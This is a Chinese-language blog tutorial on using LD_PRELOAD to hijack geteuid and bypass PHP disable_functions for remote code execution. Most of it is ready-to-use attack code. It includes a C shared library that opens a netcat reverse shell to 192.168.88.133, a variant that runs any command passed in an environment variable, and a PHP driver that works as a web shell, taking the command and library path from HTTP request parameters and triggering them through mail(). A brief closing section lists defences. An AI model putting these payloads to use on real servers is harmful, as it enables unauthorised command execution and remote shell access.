---
title: "LD_PRELOAD 绕过原理与实战利用（RCE）"
slug: ld-preload-bypass-rce
cover: ""
date: 2026-01-08
categories:
  - Web安全
  - RCE
tags:
  - LD_PRELOAD
  - RCE
  - 命令执行
halo:
  site: http://www.hzhsec.top
  name: 4c92ecd1-8fea-477a-ab70-e30fab379042
  publish: true
---

<!--more-->





<style>
img {
  display: block;
  margin: 0 auto;
  max-width: 100%;
  height: auto;
}
</style>

# LD_PRELOAD 绕过

## 一、原理

<img src="/static/屏幕截图 2024-12-27 180100.png">
<img src="/static/屏幕截图 2024-12-27 180132.png">

示例脚本（PHP）：
```php
<?php
mail('','','');
?>
```

<img src="/static/屏幕截图 2024-12-27 181623.png">

查看执行动作（演示思路）：

```
# 使用 strace 跟踪 php 执行过程并输出到文件
strace -o 1.txt -f php demo.php

# 过滤出 execve 调用
cat 1.txt | grep execve
```

<img src="/static/屏幕截图 2024-12-27 181908.png">

说明：

- 可以查看进程调用了哪些库函数与共享库。
- 如果发现某个被调用的库函数（例如 `geteuid` 或类似）来自可控的共享库，可通过 LD_PRELOAD 注入同名函数实现劫持，从而触发恶意代码执行。

<img src="/static/屏幕截图 2024-12-27 182553.png">

示例 C 代码（通过重写 `geteuid` 注入 payload）：

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("echo '小可爱，你的邮件还能发出去吗？'");
}

int geteuid() {
    unsetenv("LD_PRELOAD");
    payload();
    return 0; // 保持原行为（视需要返回合理值）
}
```

编译共享库：

```
gcc -shared -fPIC demo.c -o demo.so
```

<img src="/static/屏幕截图 2024-12-27 183203.png">

执行思路：在目标进程环境中设置 `LD_PRELOAD=/path/to/demo.so` 后启动或触发目标二进制/脚本，从而执行注入的 `payload`。

------

## 二、实战

### 1. 条件（示例）

<img src="/static/屏幕截图 2024-12-27 193730.png">

基本要求：

- 目标以可受 `LD_PRELOAD` 影响的方式加载共享库（通常是动态链接的可执行程序）。
- 有办法设置或注入环境变量（例如通过某些接口、可写的服务脚本、或本地会话）。

### 2. 构造 payload

#### 方式 1 — 直接执行反连（示例）

示例 C 代码（直接执行反连）：

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload() {
    system("nc 192.168.88.133 5432 -e /bin/bash");
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
    return 0;
}
```

编译：

```
gcc -shared -fPIC demo.c -o demo.so
```

#### 方式 2 — 通过环境变量执行（更灵活）

示例 C 代码（从环境变量读取命令）：

```
#include <stdlib.h>

int geteuid() {
    const char* cmdline = getenv("EVIL_CMDLINE"); // 从环境变量读取要执行的命令
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD"); // 避免再次触发
    system(cmdline);
    return 0;
}
```

配合的 PHP 驱动脚本（用于演示在目标环境里设置环境变量并触发 mail）：

```
<?php
$cmd = $_REQUEST["cmd"];
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd." > ".$out_path." 2>&1";

echo "<br /><b>cmdline: </b>".$evil_cmdline;

// 设置环境变量 EVIL_CMDLINE
putenv("EVIL_CMDLINE=".$evil_cmdline);

// 设置 LD_PRELOAD 指向恶意共享库
$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=".$so_path);

// 触发可导致加载共享库的函数（示例：mail）
mail("", "", "", "");

// 输出执行结果
echo "<br /><b>output: </b><br />".nl2br(file_get_contents($out_path));
?>
```

<img src="/static/屏幕截图 2024-12-27 202643.png">

注意：

- 上述为演示用途。实际环境会因权限、seLinux、AppArmor、binary hardening（比如 `setuid` 与 `setgid` 行为、`LD_PRELOAD` 在 setuid 程序上被忽略）而不同。
- 某些现代系统会在 `setuid` 可执行文件上忽略 `LD_PRELOAD`，或有 `/etc/ld.so.preload` 限制，需结合具体场景判断可行性。

补充说明（你提到的“蚁剑 插件disable_function”）：

- 若目标为 PHP 并且 `disable_functions` 禁用了 `system`/`exec` 等函数，LD_PRELOAD 绕过仍可能有效 —— 因为你是替换/注入 libc 层或被调用库层的函数，而不是直接调用被禁用的 PHP 函数。但是否可行仍取决于目标进程如何调用底层函数以及 PHP 的编译/运行方式。

------

## 三、常见检测与防护建议

- 禁止非受信任用户设置 `LD_PRELOAD` 环境变量；避免在受信任服务中直接用不可信任的环境变量启动可执行文件。
- 对入口进行最小权限原则，避免以 root 或高权限运行不受信任的脚本/服务。
- 对关键二进制使用静态链接或在启动时清理不可控环境变量。
- 使用 seccomp、AppArmor、SELinux、或启用内核硬ening（如 grsecurity）降低注入风险。
- 对可疑的 `strace`/日志、异常网络连接和新出现的共享库加载行为保持告警。

------

## 四、参考

- 若需深入，建议查阅关于 `LD_PRELOAD`、动态链接器 `ld.so` 行为、以及 setuid 程序与环境变量处理的相关文档与 CVE 研究文章。